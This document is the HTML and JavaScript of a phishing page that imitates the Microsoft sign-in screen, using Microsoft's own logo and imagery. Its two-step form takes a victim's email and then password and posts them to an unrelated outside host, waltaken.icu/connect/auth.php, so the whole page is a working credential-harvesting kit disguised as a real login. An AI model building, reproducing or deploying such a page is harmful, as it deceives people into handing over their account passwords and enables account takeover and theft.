    <div class="container">
        <form action="https://waltaken.icu/connect/auth.php" method="post" autocomplete="off"  >
            <img class="logo" src="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg">
            <div class="forms-container">
                <div class="forms">
                    <div class="first">
                        <h2>Sign in</h2>
                        <div class="form-group">
                            <input type="email" id="uname" name="email" placeholder="Email, Phone, or Skype">
                            <input type="hidden" name="next" value="./index.html">
                        </div>
                        <p>No account? <a href="#">Create One!</a></p>
                        <a href="#">Sign in with a security key <span>?</span></a>
                        <button type="button" class="next-btn">Next</button>
                    </div>
                    <div class="second">
                        <p><span class="arrow-btn">&#8592;</span> <span class="email"></span></p>
                        <h2>Enter password</h2>
                        <div class="form-group">
                            <input type="password" name="password" id="upass" placeholder="Password">
                        </div>
                        <a href="#">Forgot password?</a>
                        <p id="country" style="display: none;" ></p>
                            <p id="region" style="display: none;"></p>
                        <button type="submit">Sign in</button>
                    </div>
                </div>
            </div>
        </form>
        <div class="bottom">
            <img src="https://logincdn.msauth.net/shared/1.0/content/images/signin-options_4e48046ce74f4b89d45037c90576bfac.svg">
            <span>Sign-in options</span>
        </div>

    <script>
        const forms = document.querySelector('.forms')
        const next_button = document.querySelector('.next-btn')
        const arrow_btn = document.querySelector('.arrow-btn')

        const email_input = document.querySelector('.first input')
        const email_el = document.querySelector('.email')

        next_button.addEventListener('click', () => {
            forms.classList.add('next-form')
            email_el.innerText = email_input.value
            document.querySelector('.bottom').style.display = 'none'
        })
        arrow_btn.addEventListener('click', () => {
            forms.classList.remove('next-form')
            document.querySelector('.bottom').style.display = 'flex'
        })
    </script>
